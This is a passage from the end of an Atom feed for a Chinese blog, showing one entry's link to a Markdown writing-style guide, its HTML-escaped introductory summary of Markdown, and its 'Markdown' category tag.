href="http://jianshu.io/p/3bd994e702a7" target="_blank" rel="external">Markdown 写作规范参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介：&quot;&gt;&lt;a href=&quot;#简介：&quot; class=&quot;headerlink&quot; title=&quot;简介：&quot;&gt;&lt;/a&gt;简介：&lt;/h1&gt;&lt;p&gt;Markdown 是一种用来写作的轻量级「标记语言」，它用简洁的语法代替排版，而不像一般我们用的字处理软件 Word 或 Pages
      
    
    </summary>
    
    
      <category term="Markdown" scheme="http://www.an-time.top/tags/Markdown/"/>
    
  </entry>
  
</feed>
